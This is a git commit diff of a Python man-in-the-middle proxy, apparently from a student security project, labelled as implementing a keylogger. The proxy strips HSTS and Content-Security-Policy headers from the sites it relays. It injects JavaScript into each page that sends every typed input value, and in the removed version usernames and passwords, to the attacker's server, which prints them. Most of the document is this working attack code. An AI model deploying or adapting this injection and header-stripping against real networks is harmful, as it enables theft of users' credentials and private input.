a2ffc3a361666cbdc877553fe7a0574172aa907e
Reece <reece.mirv@gmail.com>
2024-11-17 02:25:08 -0600

    Implemented working keylogger & cross-origin-scripting

--- mainpackage/server.py
+++ mainpackage/server.py
@@ -1,10 +1,10 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse
+import requests
 import http.client
 
 from networking import *
-from modules import orig_dsts
-import time
+import json
 
 ''' Big Idea:
 # Receive all of the packets from the client
@@ -22,60 +22,34 @@ import time
 '''
 
 def modify_b_content(b_content):
-    command = f"ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d\  -f2"
-    url = clean_subprocess(command, 0)
+    server_url = f"http://{get_ip_address()}"
     new_html = '<div><button onclick="handleClick()">Click me</button></div>'
     new_script = '''
         <script>
-            // Create an object to hold the values for username and password
-            let formData = {
-                username: '',
-                password: ''
-            };
+            // Create an object to hold the input values
+            const form = {};
 
             // Listen for input events
-            document.addEventListener('input', function(event) {
+            document.addEventListener('input', function(ev) {
                 // Ensure we're dealing with an input or textarea element
-                if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+                if (ev.target.tagName === 'INPUT' || ev.target.tagName === 'TEXTAREA') {
+                    form[ev.target.name] = ev.target.value;
 
-                    // Check the order of the fields in the DOM by their position
-                    const inputs = document.querySelectorAll('input, textarea'); // Get all input/textarea elements in the document
-
-                    // If there are two fields, continue processing
-                    if (inputs.length === 2) {
-                        // Check the order of the fields
-                        const usernameField = inputs[0];
-                        const passwordField = inputs[1];
-
-                        // If the current field is the username input
-                        if (event.target === usernameField) {
-                            formData.username = event.target.value;
-                        }
-
-                        // If the current field is the password input
-                        if (event.target === passwordField) {
-                            formData.password = event.target.value;
-                        }
-
-                        // Send a POST request with both fields
-                        fetch('%s', {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                username: formData.username,
-                                password: formData.password
-                            }),
-                            headers: {
-                                "Content-type": "application/json",
-                            },
-                        })
-                        .then((response) => response.json())
-                        .then((json) => console.log(json))
-                        .catch((error) => console.error('Error:', error));
-                    }
+                    // Send a POST request with both fields
+                    fetch('%s', {
+                        method: 'POST',
+                        body: JSON.stringify(form),
+                        headers: {
+                            "Content-type": "application/json",
+                        },
+                    })
+                    .then((response) => response.json())
+                    .then((json) => console.log(json))
+                    .catch((error) => console.error('Error:', error));
                 }
             });
         </script>
-        ''' % url
+        ''' % server_url
     new_php = '''
     <?php
 
@@ -95,81 +69,34 @@ def modify_b_content(b_content):
 '''
 Somewhat works but is quite buggy
 '''
+# Create a CORSRequestHandler for Cross-Origin-Scripting
+class CORSRequestHandler(BaseHTTPRequestHandler):
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', '*')
+        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
+        super().end_headers()
 
-class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
-
-
-    def do_POST(self):
-         
-        # Parse dst host and path
-        dst_host = self.headers.get('Host')
-        dst_path = urlparse(self.path).path
-
-        # Get the contents of the POST request
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        
-        # Connect to the target server
-        conn = http.client.HTTPSConnection(dst_host)
-
-        print("POST REQUEST")
-        print(post_data)
-        print(self.headers)
-
-        if "Origin" in self.headers:
-            self.headers["Origin"] = self.headers["Origin"].replace("http", "https")
-
-        if "Referer" in self.headers:
-            self.headers["Referer"] = self.headers["Referer"].replace("http", "https")
-
-        # will have to add some kind of cookie?? Interesting error from GitHub
-            
-        print("MODIFIED HEADERS")
-        print(self.headers)
-        
-        # Forward the request to the target server
-        conn.request("POST", dst_path, post_data)
-
-        # Get the response
-        response = conn.getresponse()
-
-        print("POST RESPONSE")
-        print(response)
-        
-        self.send_response(response.status)
-        b_content = response.read()
-
-        # Send headers
-        # self.send_header('Content-type', 'text/html')
-        for header, value in response.headers.items():
-            self.send_header(header, value)
-
+    def do_OPTIONS(self):
+        self.send_response(200)
         self.end_headers()
-            
-        # Write content to wfile
-        chunk_size = 8192
-        for i in range(0, len(b_content), chunk_size):
-            chunk = b_content[i:i + chunk_size]
-            self.wfile.write(chunk)
 
-        conn.close()
-            
+class ProxyHTTPRequestHandler(CORSRequestHandler):
     def do_GET(self):
         # Parse dst host and path
         dst_host = self.headers.get('Host')
         dst_path = urlparse(self.path).path
 
-        # Create a connection to the target server
+        # Create a connection to the target server 
         conn = http.client.HTTPSConnection(dst_host)
 
-        # Forward the request to the target server
-        conn.request("GET", dst_path)
+        conn.request("GET", dst_path)   # Forward the request to the target server 
+        response = conn.getresponse()   # Get the response
 
-        # Get the response
-        response = conn.getresponse()
-
-        if "Strict-Transport-Security" in response.headers:
-            del response.headers["Strict-Transport-Security"]
+        if "Strict-Transport-Security" in response.headers: del response.headers["Strict-Transport-Security"]
+        if "Content-Security-Policy" in response.headers: del response.headers["Content-Security-Policy"]
+        if "Transfer-Encoding" in response.headers: del response.headers["Transfer-Encoding"]
         
         # Check for 301 redirect
         if response.status == 301 or response.status == 308:
@@ -189,23 +116,19 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
             # Get the new response
             new_response = new_conn.getresponse()
 
-            if "Strict-Transport-Security" in new_response.headers:
-                del new_response.headers["Strict-Transport-Security"]
-            
-            # Handle the new response as needed
-            # print("new_response:", new_response.status, new_response.reason)
-            # print("new_response:", new_response.headers)
-            b_content = new_response.read()
+            if "Strict-Transport-Security" in new_response.headers: del new_response.headers["Strict-Transport-Security"]
+            if "Content-Security-Policy" in new_response.headers: del new_response.headers["Content-Security-Policy"]
+            if "Transfer-Encoding" in new_response.headers: del new_response.headers["Transfer-Encoding"]
 
+            b_content = new_response.read()
             b_content = modify_b_content(b_content)
 
-            # Send response status code
-            self.send_response(new_response.status)
-            
-            # Send headers
-            self.send_header('Content-type', 'text/html')
+            self.send_response(new_response.status)         # Send response status code
+            for key, value in response.getheaders():        # Send headers
+                self.send_header(key, value)
+                # print(key, value)
 
-            self.end_headers()
+            self.end_headers()                              # Send end headers (includes CORS headers)
 
             # Write content to wfile in chunks
             chunk_size = 8192
@@ -215,18 +138,14 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
 
             new_conn.close()
         else:
-            # print("response:", response.status, response.reason)
-            # print("response:", response.headers)
-
-            # Send response status code
-            self.send_response(response.status)
             b_content = response.read()
-
             b_content = modify_b_content(b_content)
 
-            # Send headers
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
+            self.send_response(response.status)             # Send response status code
+            for key, value in response.getheaders():        # Send headers
+                self.send_header(key, value)
+                # print(key, value)
+            self.end_headers()                              # Send end headers (includes CORS headers)
             
             # Write content to wfile
             chunk_size = 8192
@@ -236,6 +155,89 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
 
         conn.close()
 
+    def do_POST(self):
+        try:
+            # # Get the contents of the POST request
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            post_data_obj = json.loads(post_data.decode())
+            
+            # Try to print out the key value pairs of filled input fields
+            try:
+                print("\n------------- Input Values Start -------------")
+                for key in post_data_obj:
+                    print(f"    {key}: {post_data_obj[key]}")
+                print("-------------- Input Values End --------------\n")
+            except:
+                pass
+            
+            print("\nHEADERS\n")
+            for key, value in self.headers.items():
+                print(key, value)
+            
+            print("\nDATA OBJ\n")
+            for key, value in post_data_obj.items():
+                print(key, value)
+
+        except Exception as ev:
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b"Error: " + str(ev).encode())
+
+    # def do_POST(self):
+         
+    #     # Parse dst host and path
+    #     dst_host = self.headers.get('Host')
+    #     dst_path = urlparse(self.path).path
+
+    #     # Get the contents of the POST request
+    #     content_length = int(self.headers['Content-Length'])
+    #     post_data = self.rfile.read(content_length)
+        
+    #     # Connect to the target server
+    #     conn = http.client.HTTPSConnection(dst_host)
+
+    #     print("POST REQUEST")
+    #     print(post_data)
+    #     print(self.headers)
+
+    #     if "Origin" in self.headers:
+    #         self.headers["Origin"] = self.headers["Origin"].replace("http", "https")
+
+    #     if "Referer" in self.headers:
+    #         self.headers["Referer"] = self.headers["Referer"].replace("http", "https")
+
+    #     # will have to add some kind of cookie?? Interesting error from GitHub
+            
+    #     print("MODIFIED HEADERS")
+    #     print(self.headers)
+        
+    #     # Forward the request to the target server
+    #     conn.request("POST", dst_path, post_data)
+
+    #     # Get the response
+    #     response = conn.getresponse()
+
+    #     print("POST RESPONSE")
+    #     print(response)
+        
+    #     self.send_response(response.status)
+    #     b_content = response.read()
+
+    #     # Send headers
+    #     # self.send_header('Content-type', 'text/html')
+    #     for header, value in response.headers.items():
+    #         self.send_header(header, value)
+
+    #     self.end_headers()
+            
+    #     # Write content to wfile
+    #     chunk_size = 8192
+    #     for i in range(0, len(b_content), chunk_size):
+    #         chunk = b_content[i:i + chunk_size]
+    #         self.wfile.write(chunk)
+
+    #     conn.close()
 
 class Server:
     def __init__(self, http_daemon = None, target_ip = None, is_ready_bool = False):
@@ -267,46 +269,3 @@ class Server:
             self.is_ready_bool = False
 
             print("Server closed...")
-
-
-'''
-Refer back to later (header popping)
-'''
-
-# from networking import *
-# from modules import *
-# from scapy.layers.http import *
-
-# class ProxyHTTPRequestHandler(SimpleHTTPRequestHandler):
-#     def do_GET(self):
-#         self.send_response(200)
-#         self.send_header("Content-Type", "text")
-#         self.wfile.write(b'Hello, world!')
-
-#     # def do_GET(self):
-#     #     # Forward the request to the target server
-#     #     resp = requests.get("http://danger.jeffondich.com/")
-#     #     b_content = None
-
-#     #     # Modify HTTP(S) Headers / Response
-#     #     try: b_content = resp.content.replace(b"https://", b"http://")
-#     #     except: pass
-
-#     #     try: resp.headers.pop("Strict-Transport-Security", None)
-#     #     except: pass
-
-#     #     try: resp.headers.pop("Transfer-Encoding", None)
-#     #     except: pass
-
-#     #     try: resp.headers.pop("Content-Encoding", None)
-#     #     except: pass
-
-#     #     # Send modified response
-#     #     self.send_response(200)
-#     #     for header, value in resp.headers.items():
-#     #         self.send_header(header, value)
-#     #         print(f"Sent: {header}: {value}")
-#     #     self.end_headers()
-#     #     self.wfile.write(b_content)
-
-
